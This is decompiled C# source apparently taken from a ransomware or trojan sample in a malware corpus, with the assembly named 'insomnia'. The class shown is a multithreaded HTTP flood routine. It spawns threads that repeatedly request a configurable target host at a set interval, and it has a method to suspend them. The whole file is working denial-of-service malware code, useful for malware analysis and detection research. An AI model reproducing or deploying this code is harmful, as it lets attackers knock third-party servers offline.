// Decompiled with JetBrains decompiler
// Type: insomnia.Class15
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System.Net;
using System.Threading;

namespace insomnia
{
  internal class Class15
  {
    private static ThreadStart[] Field7;
    private static Thread[] Field6;
    public static string Field5;
    public static int Field4 = 20;
    public static bool Field3 = false;
    private static Class15.Class16[] Field2;
    public static int Field1 = 2;

    public static void Method2()
    {
      Class15.Field6 = new Thread[Class15.Field1];
      Class15.Field7 = new ThreadStart[Class15.Field1];
      Class15.Field2 = new Class15.Class16[Class15.Field1];
      for (int index = 0; index < Class15.Field1; ++index)
      {
        Class15.Field2[index] = new Class15.Class16(Class15.Field5, Class15.Field4);
        Class15.Field7[index] = new ThreadStart(Class15.Field2[index].Method1);
        Class15.Field6[index] = new Thread(Class15.Field7[index]);
        Class15.Field6[index].Start();
      }
      Class15.Field3 = true;
    }

    public static void Method1()
    {
      for (int index = 0; index < Class15.Field1; ++index)
      {
        try
        {
          Class15.Field6[index].Suspend();
          Class15.Field6[index] = (Thread) null;
          Class15.Field7[index] = (ThreadStart) null;
          Class15.Field2[index] = (Class15.Class16) null;
        }
        catch
        {
        }
      }
      Class15.Field3 = false;
    }

    private class Class16
    {
      private string Field3;
      private WebClient Field2 = new WebClient();
      private int Field1;

      public Class16(string Host, int Interval)
      {
        this.Field3 = Host;
        this.Field1 = Interval;
      }

      public void Method1()
      {
        while (true)
        {
          try
          {
            this.Field2.DownloadString(this.Field3);
            Thread.Sleep(this.Field1);
          }
          catch
          {
            Thread.Sleep(this.Field1);
          }
        }
      }
    }
  }
}
